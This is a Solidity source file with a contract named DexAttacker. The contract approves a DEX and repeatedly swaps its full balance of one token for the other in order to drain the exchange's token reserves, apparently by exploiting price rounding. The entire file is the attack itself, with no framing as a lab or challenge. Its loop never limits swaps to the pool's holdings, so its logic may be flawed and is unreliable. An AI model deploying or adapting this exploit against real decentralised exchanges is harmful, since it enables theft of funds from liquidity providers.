// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
}

contract DexAttacker {
    IDex public immutable dex;
    
    constructor(address _dex) {
        require(_dex != address(0), "Invalid Dex address");
        dex = IDex(_dex);
        
        // Verify the contract supports the required interface
        try dex.token1() returns (address) {} catch {
            revert("Contract doesn't implement token1()");
        }
    }
    
    function attack() external {
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        // Approve dex to spend all our tokens
        dex.approve(address(dex), type(uint).max);
        
        // Get initial balances
        uint balance1 = dex.balanceOf(token1, address(this));
        uint balance2 = dex.balanceOf(token2, address(this));
        
        // Perform series of swaps to drain one token
        while (balance1 > 0 && balance2 > 0) {
            if (balance1 <= balance2) {
                // Swap all of token1 for token2
                dex.swap(token1, token2, balance1);
                balance1 = 0;
                balance2 = dex.balanceOf(token2, address(this));
            } else {
                // Swap all of token2 for token1
                dex.swap(token2, token1, balance2);
                balance2 = 0;
                balance1 = dex.balanceOf(token1, address(this));
            }
        }
    }
    
    // Needed to receive tokens
    receive() external payable {}
}